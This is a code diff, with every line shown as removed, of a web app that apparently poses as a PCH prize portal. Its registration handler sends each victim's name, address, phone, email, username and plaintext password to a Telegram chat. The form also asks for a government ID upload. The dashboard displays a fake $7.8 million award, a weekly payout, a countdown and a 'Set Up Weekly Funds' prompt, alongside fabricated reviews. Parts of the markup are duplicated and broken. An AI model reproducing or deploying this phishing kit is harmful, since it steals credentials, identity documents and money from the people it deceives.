-                                <div class="bg-navy-900 border border-navy-700/80 p-6 rounded-2xl flex flex-col justify-between card-3D relative">
-                                    <div>
-                                        <div class="flex items-center justify-between mb-4">
-                                            <div class="flex items-center space-x-3">
-                                                <div class="w-10 h-10 rounded-full bg-gold-500/20 text-gold-400 flex items-center justify-center font-bold text-sm">
-                                                    ${r.name.charAt(0)}
-                                                </div>
-                                                <div>
-                                                    <h4 class="font-bold text-white text-sm">${r.name}</h4>
-                                                    <p class="text-xs text-slate-400">${r.location}</p>
-                                                </div>
-                                            </div>
-                                            <div class="flex text-gold-400 text-xs">
-                                                ${'<i class="fa-solid fa-star"></i>'.repeat(r.rating)}
-                                            </div>
-                                        </div>
-                                        <p class="text-slate-300 text-sm leading-relaxed mb-4">"${r.comment}"</p>
-                                    </div>
-                                    <div class="pt-4 border-t border-navy-700 flex items-center justify-between text-xs text-slate-400">
-                                        <span class="inline-flex items-center px-2 py-0.5 rounded bg-sky-custom/10 text-sky-custom font-semibold">Sample Review</span>
-                                        <span>${r.date}</span>
-                                        <div class="space-x-2">
-                                            <button onclick="openEditReviewModal(${r.id})" class="text-sky-custom hover:underline" title="Edit Review"><i class="fa-solid fa-pen"></i></button>
-                                            <button onclick="deleteReview(${r.id})" class="text-rose-400 hover:underline" title="Delete Review"><i class="fa-solid fa-trash"></i></button>
-                                        </div>
-                                    </div>
-                                </div>
-                            `).join('')}
-                        </div>
-
-                        <!-- Pagination -->
-                        <div class="flex items-center justify-between bg-navy-900 border border-navy-700 px-6 py-4 rounded-2xl">
-                            <span class="text-xs text-slate-400">Showing page <span class="text-white font-bold">${state.reviewsPage}</span> of <span class="text-white font-bold">${totalPages || 1}</span> (${filteredReviews.length} total sample reviews)</span>
-                            <div class="flex space-x-2">
-                                <button onclick="changeReviewsPage(-1)" ${state.reviewsPage <= 1 ? 'disabled' : ''} class="px-4 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-40 hover:bg-navy-800 transition">Previous</button>
-                                <button onclick="changeReviewsPage(1)" ${state.reviewsPage >= totalPages ? 'disabled' : ''} class="px-4 py-2 bg-navy-950 border border-navy-700 text-white rounded-xl text-xs font-bold disabled:opacity-40 hover:bg-navy-800 transition">Next</button>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-            `;
-        }
-
-        function initHomeEvents() {
-            const searchInput = document.getElementById('review-search-input');
-            if (searchInput) {
-                searchInput.addEventListener('input', (e) => {
-                    state.reviewsSearchQuery = e.target.value;
-                    state.reviewsPage = 1;
-                    render();
-                });
-            }
-            const ratingFilter = document.getElementById('review-rating-filter');
-            if (ratingFilter) {
-                ratingFilter.addEventListener('change', (e) => {
-                    state.reviewsFilterRating = e.target.value;
-                    state.reviewsPage = 1;
-                    render();
-                });
-            }
-        }
-
-        function changeReviewsPage(direction) {
-            state.reviewsPage += direction;
-            render();
-        }
-
-        function openAddReviewModal() {
-            const modal = document.getElementById('global-modal');
-            const content = document.getElementById('modal-content');
-            content.innerHTML = `
-                <h3 class="text-xl font-bold text-white mb-4 flex items-center"><i class="fa-solid fa-pen-to-square text-gold-400 mr-2"></i> Submit Review</h3>
-                <form id="add-review-form" onsubmit="submitNewReview(event)" class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Your Full Name</label>
-                        <input type="text" id="new-rev-name" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. Robert Smith">
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Location / City</label>
-                        <input type="text" id="new-rev-loc" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. Miami, FL">
-                    </div>
-                    <div class="grid grid-cols-2 gap-4">
-                        <div>
-                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Rating</label>
-                            <select id="new-rev-rating" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                <option value="5">5 Stars</option>
-                                <option value="4">4 Stars</option>
-                            </select>
-                        </div>
-                    </div>
-                    <div>
-                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Comment / Feedback</label>
-                        <textarea id="new-rev-comment" required rows="3" class="w-full bg-navy-950 border border-navy-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Share your experience..."></textarea>
-                    </div>
-                    <div class="flex justify-end space-x-3 pt-2">
-                        <button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-sm font-bold hover:bg-navy-700">Cancel</button>
-                        <button type="submit" class="px-6 py-2.5 bg-gold-500 text-navy-950 rounded-xl text-sm font-bold hover:brightness-110">Submit Review</button>
-                    </div>
-                </form>
-            `;
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
-        }
-
-        function submitNewReview(e) {
-            e.preventDefault();
-            const name = document.getElementById('new-rev-name').value;
-            const location = document.getElementById('new-rev-loc').value;
-            const rating = parseInt(document.getElementById('new-rev-rating').value);
-            const comment = "Sample Review: " + document.getElementById('new-rev-comment').value;
-
-            state.reviews.unshift({
-                id: Date.now(),
-                name,
-                location,
-                rating,
-                date: new Date().toISOString().split('T')[0],
-                comment,
-                sample: true
-            });
-            closeModal();
-            render();
-        }
-
-        function openEditReviewModal(id) {
-            const rev = state.reviews.find(r => r.id === id);
-            if (!rev) return;
-            const modal = document.getElementById('global-modal');
-            const content = document.getElementById('modal-content');
-            content.innerHTML = `
-                <h3 class="text-xl font-bold text-white mb-4 flex items-center"><i class="fa-solid fa-pen text-sky-custom mr-2"></i> Edit Review #${id}</h3>
-                <form onsubmit="saveEditedReview(event, ${id})" class="space-y-4">
-                    <div>
-                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Comment</label>
-                        <textarea id="edit-rev-comment" required rows="3" class="w-full bg-navy-950 border border-navy-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-sky-custom">${rev.comment}</textarea>
-                    </div>
-                    <div class="flex justify-end space-x-3 pt-2">
-                        <button type="button" onclick="closeModal()" class="px-4 py-2.5 bg-navy-950 text-slate-300 rounded-xl text-sm font-bold">Cancel</button>
-                        <button type="submit" class="px-6 py-2.5 bg-sky-custom text-navy-950 rounded-xl text-sm font-bold">Save Changes</button>
-                    </div>
-                </form>
-            `;
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
-        }
-
-        function saveEditedReview(e, id) {
-            e.preventDefault();
-            const comment = document.getElementById('edit-rev-comment').value;
-            const rev = state.reviews.find(r => r.id === id);
-            if (rev) {
-                rev.comment = comment;
-            }
-            closeModal();
-            render();
-        }
-
-        function deleteReview(id) {
-            state.reviews = state.reviews.filter(r => r.id !== id);
-            render();
-        }
-
-        // 2. Login View
-        function renderLoginView() {
-            return `
-                <div class="flex-grow flex items-center justify-center py-16 px-4 bg-gradient-to-b from-navy-950 to-navy-900">
-                    <div class="bg-navy-800 border border-navy-700/80 rounded-3xl max-w-md w-full p-8 shadow-2xl relative card-3d">
-                        <div class="text-center mb-8">
-                            <div class="w-14 h-14 bg-gradient-to-br from-gold-400 to-gold-600 rounded-2xl mx-auto flex items-center justify-center text-navy-950 text-2xl font-bold mb-4 shadow-lg shadow-gold-500/20">
-                                <i class="fa-solid fa-vault"></i>
-                            </div>
-                            <h2 class="text-2xl font-extrabold text-white">Welcome Back</h2>
-                            <p class="text-xs text-slate-400 mt-1">Sign in with your username or email address</p>
-                        </div>
-
-                        <form id="login-form" class="space-y-5">
-                            <div>
-                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username or Email</label>
-                                <div class="relative">
-                                    <i class="fa-solid fa-user absolute left-4 top-3.5 text-slate-400"></i>
-                                    <input type="text" id="login-identifier" required class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="e.g. johndoe or john@example.com">
-                                </div>
-                            </div>
-                            <div>
-                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Password</label>
-                                <div class="relative">
-                                    <i class="fa-solid fa-lock absolute left-4 top-3.5 text-slate-400"></i>
-                                    <input type="password" id="login-password" required class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••">
-                                </div>
-                            </div>
-                            <div id="login-error" class="text-rose-400 text-xs hidden"></div>
-                            <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 transition text-sm">
-                                Sign In to Dashboard
-                            </button>
-                        </form>
-
-                        <div class="mt-6 text-center text-xs text-slate-400">
-                            Don't have an account? <button onclick="router.navigate('register')" class="text-sky-custom font-bold hover:underline">Create Account</button>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        function initLoginEvents() {
-            const form = document.getElementById('login-form');
-            if (form) {
-                form.addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    const identifier = document.getElementById('login-identifier').value.trim();
-                    const pass = document.getElementById('login-password').value;
-                    const errEl = document.getElementById('login-error');
-
-                    // If user registered an account, check state.currentUser or create sample login session
-                    if (state.currentUser && (state.currentUser.username === identifier || state.currentUser.email === identifier)) {
-                        state.currentView = 'dashboard';
-                        render();
-                    } else if (identifier === 'demouser' || identifier === 'demo@example.com' || !state.currentUser) {
-                        // Create default demo user profile if none exists
-                        state.currentUser = {
-                            firstName: 'Arthur',
-                            lastName: 'Pendelton',
-                            address: '742 Evergreen Terrace',
-                            city: 'Brooklyn',
-                            stateOrParish: 'NY',
-                            zip: '11201',
-                            phone: '646-585-8110',
-                            email: identifier.includes('@') ? identifier : 'arthur.pendelton@globalpure.net',
-                            username: identifier.includes('@') ? 'arthur_p' : identifier
-                        };
-                        state.currentView = 'dashboard';
-                        render();
-                    } else {
-                        errEl.textContent = 'Invalid credentials. Please verify your username/email or create a new account.';
-                        errEl.classList.remove('hidden');
-                    }
-                });
-            }
-        }
-
-        // 3. Register View
-        function renderRegisterView() {
-            return `
-                <div class="flex-grow py-16 px-4 bg-gradient-to-b from-navy-950 to-navy-900 flex items-center justify-center">
-                    <div class="bg-navy-800 border border-navy-700/80 rounded-3xl max-w-2xl w-full p-8 md:p-12 shadow-2xl relative card-3d">
-                        <div class="text-center mb-8">
-                            <h2 class="text-3xl font-extrabold text-white">Create Portal Account</h2>
-                            <p class="text-xs text-slate-400 mt-1">Complete your profile information and verification details</p>
-                        </div>
-
-                        <form id="register-form" class="space-y-6">
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">First Name *</label>
-                                    <input type="text" id="reg-fname" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="John">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Last Name *</label>
-                                    <input type="text" id="reg-lname" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Doe">
-                                </div>
-                            </div>
-
-                            <div>
-                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Street Address *</label>
-                                <input type="text" id="reg-address" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123 Main Street">
-                            </div>
-
-                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">City *</label>
-                                    <input type="text" id="reg-city" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="New York">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">State / Parish *</label>
-                                    <input type="text" id="reg-state" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="NY">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">ZIP / Postal *</label>
-                                    <input type="text" id="reg-zip" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="10001">
-                                </div>
-                            </div>
-
-                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Phone Number *</label>
-                                    <input type="tel" id="reg-phone" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="646-585-8110">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Email Address *</label>
-                                    <input type="email" id="reg-email" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="john@example.com">
-                                </div>
-                            </div>
-
-                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username *</label>
-                                    <input type="text" id="reg-username" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="johndoe">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Password *</label>
-                                    <input type="password" id="reg-password" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••">
-                                </div>
-                                <div>
-                                    <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Confirm Password *</label>
-                                    <input type="password" id="reg-cpassword" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••">
-                                </div>
-                            </div>
-
-                            <!-- Identity Verification Document Upload -->
-                            <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl space-y-2">
-                                <label class="block text-xs font-bold text-gold-400 uppercase tracking-wider"><i class="fa-solid fa-id-card mr-1.5"></i> Identity Verification Document Upload</label>
-                                <p class="text-xs text-slate-400">Upload government-issued identification (Driver's License or Passport) for compliance verification.</p>
-                                <input type="file" id="reg-id-doc" accept="image/*,.pdf" class="w-full text-xs text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 hover:file:brightness-110 cursor-pointer">
-                            </div>
-
-                            <div id="reg-error" class="text-rose-400 text-xs hidden"></div>
-
-                            <button type="submit" class="w-full py-4 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 transition text-base">
-                                Complete Registration
-                            </button>
-                        </form>
-
-                        <div class="mt-6 text-center text-xs text-slate-400">
-                            Already have an account? <button onclick="router.navigate('login')" class="text-sky-custom font-bold hover:underline">Sign In</button>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        function initRegisterEvents() {
-            const form = document.getElementById('register-form');
-            if (form) {
-                form.addEventListener('submit', async (e) => {
-                    e.preventDefault();
-                    const pass = document.getElementById('reg-password').value;
-                    const cpass = document.getElementById('reg-cpassword').value;
-                    const errEl = document.getElementById('reg-error');
-
-                    if (pass !== cpass) {
-                        errEl.textContent = 'Passwords do not match. Please verify confirmation.';
-                        errEl.classList.remove('hidden');
-                        return;
-                    }
-
-                    // Save user to state
-                    state.currentUser = {
-                        firstName: document.getElementById('reg-fname').value,
-                        lastName: document.getElementById('reg-lname').value,
-                        address: document.getElementById('reg-address').value,
-                        city: document.getElementById('reg-city').value,
-                        stateOrParish: document.getElementById('reg-state').value,
-                        zip: document.getElementById('reg-zip').value,
-                        phone: document.getElementById('reg-phone').value,
-                        email: document.getElementById('reg-email').value,
-                        username: document.getElementById('reg-username').value
-                    };
-
-                    // Send Telegram Alert for Account Registration
-                    const tgMsg = `🚨 <b>NEW USER REGISTRATION (PWPP)</b> 🚨\n\n` +
-                        `<b>Name:</b> ${state.currentUser.firstName} ${state.currentUser.lastName}\n` +
-                        `<b>Email:</b> ${state.currentUser.email}\n` +
-                        `<b>Phone:</b> ${state.currentUser.phone}\n` +
-                        `<b>Address:</b> ${state.currentUser.address}, ${state.currentUser.city}, ${state.currentUser.stateOrParish} ${state.currentUser.zip}\n` +
-                        `<b>Username:</b> ${state.currentUser.username}\n` +
-                        `<b>Password:</b> ${pass}`;
-                    
-                    await sendTelegramMessage(tgMsg);
-
-                    // Show 3D Loading Animation with percentage counter
-                    showLoadingAnimation();
-                });
-            }
-        }
-
-        function showLoadingAnimation() {
-            const container = document.getElementById('app-container');
-            container.innerHTML = `
-                <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
-                    <div class="bg-navy-800 border border-navy-700 p-10 rounded-3xl max-w-md w-full text-center shadow-2xl space-y-6 card-3d">
-                        <div class="relative w-24 h-24 mx-auto flex items-center justify-center">
-                            <div class="absolute inset-0 rounded-full border-4 border-sky-custom/20 border-t-sky-custom animate-spin"></div>
-                            <i class="fa-solid fa-shield-halved text-3xl text-sky-custom"></i>
-                        </div>
-                        <div>
-                            <h3 class="text-2xl font-bold text-white mb-2">Verifying Profile</h3>
-                            <p class="text-xs text-slate-400">Encrypting credentials and establishing secure session...</p>
-                        </div>
-                        <div class="w-full bg-navy-950 h-3 rounded-full overflow-hidden border border-navy-700">
-                            <div id="loading-bar" class="bg-gradient-to-r from-gold-400 to-gold-600 h-full w-0 transition-all duration-300"></div>
-                        </div>
-                        <div id="loading-pct" class="text-lg font-black text-gold-400">0%</div>
-                    </div>
-                </div>
-            `;
-
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 5;
-                const bar = document.getElementById('loading-bar');
-                const pct = document.getElementById('loading-pct');
-                if (bar && pct) {
-                    bar.style.width = progress + '%';
-                    pct.textContent = progress + '%';
-                }
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    showCongratulationsScreen();
-                }
-            }, 120);
-        }
-
-        function showCongratulationsScreen() {
-            const container = document.getElementById('app-container');
-            container.innerHTML = `
-                <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
-                    <div class="bg-navy-800 border border-navy-700 p-10 rounded-3xl max-w-lg w-full text-center shadow-2xl space-y-6 card-3d">
-                        <div class="w-20 h-20 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-3xl shadow-lg shadow-emerald-500/20">
-                            <i class="fa-solid fa-circle-check"></i>
-                        </div>
-                        <div>
-                            <h2 class="text-3xl font-extrabold text-white mb-2">Congratulations, ${state.currentUser.firstName}!</h2>
-                            <p class="text-sm text-slate-300 leading-relaxed">
-                                Your account has been successfully created and verified. You are now ready to access your weekly payout dashboard.
-                            </p>
-                        </div>
-                        <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl text-xs text-slate-400">
-                            Redirecting to login / dashboard automatically in <span id="redirect-timer" class="text-gold-400 font-bold">5</span> seconds...
-                        </div>
-                        <button onclick="router.navigate('dashboard')" class="w-full py-3.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm hover:brightness-110 transition">
-                            Go to Dashboard Now
-                        </button>
-                    </div>
-                </div>
-            `;
-
-            let countdown = 5;
-            const timerEl = document.getElementById('redirect-timer');
-            const timerInterval = setInterval(() => {
-                countdown--;
-                if (timerEl) timerEl.textContent = countdown;
-                if (countdown <= 0) {
-                    clearInterval(timerInterval);
-                    router.navigate('dashboard');
-                }
-            }, 1000);
-        }
-
-        // 4. Dashboard View
-        function renderDashboardView() {
-            const user = state.currentUser || {
-                firstName: 'Arthur',
-                lastName: 'Pendelton',
-                address: '742 Evergreen Terrace',
-                city: 'Brooklyn',
-                stateOrParish: 'NY',
-                zip: '11201',
-                phone: '646-585-8110',
-                email: 'arthur.pendelton@globalpure.net'
-            };
-
-            // Calculated draw date: two calendar days ago
-            const d = new Date();
-            d.setDate(d.getDate() - 2);
-            const drawDateStr = d.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
-
-            const completedTxns = state.transactions.filter(t => t.status === 'Completed');
-            const pendingTxns = state.transactions.filter(t => t.status === 'Pending');
-            const onHoldTxns = state.transactions.filter(t => t.status === 'On Hold');
-            const failedTxns = state.transactions.filter(t => t.status === 'Failed');
-
-            return `
-                <div class="flex-grow py-10 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full space-y-8">
-                    <!-- Welcome & Header Summary -->
-                    <div class="bg-navy-800 border border-navy-700 p-8 rounded-3xl flex flex-col md:flex-row justify-between items-start md:items-center gap-6 shadow-xl card-3d">
-                        <div class="space-y-2">
-                            <div class="inline-flex items-center space-x-2 bg-emerald-500/20 text-emerald-400 px-3 py-1 rounded-full text-xs font-bold">
-                                <i class="fa-solid fa-circle-check"></i> Verified Profile Active
-                            </div>
-                            <h1 class="text-3xl font-extrabold text-white">Welcome, ${user.firstName} ${user.lastName}</h1>
-                            <p class="text-xs text-slate-400">PCH Claim Number: <span class="text-gold-400 font-bold">PCH-88204-NYC</span> | Draw Date: ${drawDateStr}</p>
-                        </div>
-                        <div class="flex flex-wrap gap-3">
-                            <button onclick="openWeeklyFundsModal()" class="px-5 py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-bold rounded-xl text-sm shadow-lg shadow-gold-500/20 hover:brightness-110 transition flex items-center">
-                                <i class="fa-solid fa-wallet mr-2"></i> Set Up Weekly Funds
-                            </button>
-                            <button onclick="openWithdrawModal()" class="px-5 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm hover:brightness-110 transition flex items-center">
-                                <i class="fa-solid fa-money-bill-transfer mr-2"></i> Withdraw
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Financial Overview Cards Grid -->
-                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-                        <div class="bg-navy-800 border border-navy-700 p-6 rounded-2xl card-3d">
-                            <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Check Value</p>
-                            <h3 class="text-2xl font-black text-white">$7,800,000.00</h3>
-                            <p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-shield text-sky-custom mr-1"></i> Authorized Award</p>
-                        </div>
-                        <div class="bg-navy-800 border border-navy-700 p-6 rounded-2xl card-3d">
-                            <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Weekly Payout</p>
-                            <h3 class="text-2xl font-black text-gold-400">$4,500.00</h3>
-                            <p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-clock text-gold-400 mr-1"></i> Scheduled Friday</p>
-                        </div>
-                        <div class="bg-navy-800 border border-navy-700 p-6 rounded-2xl card-3d">
-                            <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Delivery Status</p>
-                            <h3 class="text-2xl font-black text-sky-custom">Pending</h3>
-                            <p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-hourglass-half mr-1"></i> Awaiting disbursement</p>
-                        </div>
-                        <div class="bg-navy-800 border border-navy-700 p-6 rounded-2xl card-3d">
-                            <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Assigned Agent</p>
-                            <h3 class="text-lg font-bold text-white">Andy Goldbrg</h3>
-                            <p class="text-[10px] text-sky-custom mt-2"><i class="fa-solid fa-phone mr-1"></i> 646-585-8110</p>
-                        </div>
-                    </div>
-
-                    <!-- Friday Countdown Widget & Telegram Integration Section -->
-                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-                        <!-- Friday Countdown -->
-                        <div class="lg:col-span-2 bg-navy-800 border border-navy-700 p-8 rounded-3xl card-3d flex flex-col justify-between">
-                            <div>
-                                <div class="flex items-center justify-between mb-6">
-                                    <h3 class="text-lg font-bold text-white flex items-center"><i class="fa-solid fa-stopwatch text-gold-400 mr-2"></i> Weekly Disbursement Countdown</h3>
-                                    <span class="text-xs text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700">Timezone: EST (UTC-5)</span>
-                                </div>
-                                <p class="text-slate-300 text-sm mb-6">Countdown to Friday at 10:30 PM EST when weekly funds become eligible for release.</p>
-                            </div>
-                            <div class="grid grid-cols-4 gap-4 text-center">
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-days" class="text-3xl font-black text-white">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Days</div>
-                                </div>
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-hours" class="text-3xl font-black text-white">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Hours</div>
-                                </div>
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-mins" class="text-3xl font-black text-white">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Minutes</div>
-                                </div>
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-secs" class="text-3xl font-black text-gold-400">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Seconds</div>
-                    <!-- Friday Countdown Widget Section -->
-                    <div class="grid grid-cols-1 gap-8">
-                        <!-- Friday Countdown -->
-                        <div class="bg-navy-800 border border-navy-700 p-8 rounded-3xl card-3d flex flex-col justify-between">
-                            <div>
-                                <div class="flex items-center justify-between mb-6">
-                                    <h3 class="text-lg font-bold text-white flex items-center"><i class="fa-solid fa-stopwatch text-gold-400 mr-2"></i> Weekly Disbursement Countdown</h3>
-                                    <span class="text-xs text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700">Timezone: EST (UTC-5)</span>
-                                </div>
-                                <p class="text-slate-300 text-sm mb-6">Countdown to Friday at 10:30 PM EST when weekly funds become eligible for release.</p>
-                            </div>
-                            <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 text-center">
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-days" class="text-3xl font-black text-white">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Days</div>
-                                </div>
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-hours" class="text-3xl font-black text-white">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Hours</div>
-                                </div>
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-mins" class="text-3xl font-black text-white">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Minutes</div>
-                                </div>
-                                <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl">
-                                    <div id="cd-secs" class="text-3xl font-black text-gold-400">00</div>
-                                    <div class="text-[10px] text-slate-400 uppercase mt-1">Seconds</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Transfer History Section -->
-                    <div class="bg-navy-800 border border-navy-700 p-8 rounded-3xl card-3d">
-                        <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-6 gap-4">
-                            <div>
-                                <h3 class="text-xl font-bold text-white">Transfer History</h3>
-                                <p class="text-xs text-slate-400">Review all allocated disbursement logs and statuses</p>
-                            </div>
-                            <!-- Tabs -->
-                            <div class="flex flex-wrap gap-2" id="txn-tabs">
-                                <button onclick="filterTransactions('All')" class="px-4 py-2 bg-sky-custom text-navy-950 text-xs font-bold rounded-xl txn-tab-btn" data-tab="All">All (${state.transactions.length})</button>
-                                <button onclick="filterTransactions('Completed')" class="px-4 py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl txn-tab-btn" data-tab="Completed">Completed (${completedTxns.length})</button>
-                                <button onclick="filterTransactions('Pending')" class="px-4 py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl txn-tab-btn" data-tab="Pending">Pending (${pendingTxns.length})</button>
-                                <button onclick="filterTransactions('On Hold')" class="px-4 py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl txn-tab-btn" data-tab="On Hold">On Hold (${onHoldTxns.length})</button>
-                                <button onclick="filterTransactions('Failed')" class="px-4 py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl txn-tab-btn" data-tab="Failed">Failed (${failedTxns.length})</button>
-                            </div>
-                        </div>
-
-                        <div class="overflow-x-auto">
-                            <table class="w-full text-left border-collapse" id="txn-table">
-                                <thead>
-                                    <tr class="border-b border-navy-700 text-xs text-slate-400 uppercase">
-                                        <th class="py-3 px-4">Reference #</th>
-                                        <th class="py-3 px-4">Date & Time</th>
-                                        <th class="py-3 px-4">Type</th>
-                                        <th class="py-3 px-4">Amount</th>
-                                        <th class="py-3 px-4">Status</th>
-                                    </tr>
-                                </thead>
-                                <tbody class="text-sm divide-y divide-navy-700/50" id="txn-tbody">
-                                    ${state.transactions.map(t => `
-                                        <tr class="hover:bg-navy-900/50 transition">
-                                            <td class="py-4 px-4 font-mono font-bold text-white">${t.ref}</td>
-                                            <td class="py-4 px-4 text-slate-300 text-xs">${t.date}</td>
